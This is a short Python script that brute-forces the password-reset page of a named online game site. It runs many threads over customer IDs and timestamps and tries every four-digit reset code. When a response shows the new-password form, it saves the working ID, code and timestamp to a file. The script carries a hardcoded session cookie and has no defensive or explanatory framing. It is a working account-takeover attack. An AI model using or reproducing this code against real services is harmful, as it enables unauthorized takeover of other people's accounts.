import requests
import threading
import time
s = requests.Session()
timestamp = 1468087193 # 玉帝


headers = {
"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Encoding":"gzip, deflate, sdch",
"Accept-Language":"zh-CN,zh;q=0.8",
"Connection":"keep-alive",
"Cookie":"PHPSESSID=llvd32qkmelm22j825i8ivi4e0",
"Host":"www.infestationmmo.com.cn",
"Referer":"http://www.infestationmmo.com.cn/forgot_password.php",
"Upgrade-Insecure-Requests":"1",
"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
}

def trial(customer_id, timestamp):
    for code in range(1000, 10000):
        while True:
            try:
                url = "http://www.infestationmmo.com.cn/forgot_password.php?act=step&CustomerID=%s&code=%s&time=%s" % ( customer_id, code, timestamp )
                res = s.get(url = url, headers = headers, )
                if res.text.find( "新密码" ) != -1:
                    print( customer_id, code, timestamp )
                    f = open( "change_pwd.txt", "w" )
                    f.write( "{}\n{}\n{}".format( customer_id, code, timestamp ) )
                    f.close()
                else:
                    print(url)
                break
            except Exception as e:
                print( "Warning:{}".format(e) )

for timestamp in range( 1468087193, 1468087195 ):
    for customer_id in range(1000, 1200,200):
        t_list = list()
        for i in range( customer_id, customer_id + 200):
            t = threading.Thread( target = trial, args = ( i, timestamp ) )
            print( i, timestamp )
            t_list.append( t )
        for t in t_list:
            t.start()
            time.sleep(0.1)
        for t in t_list:
            t.join()
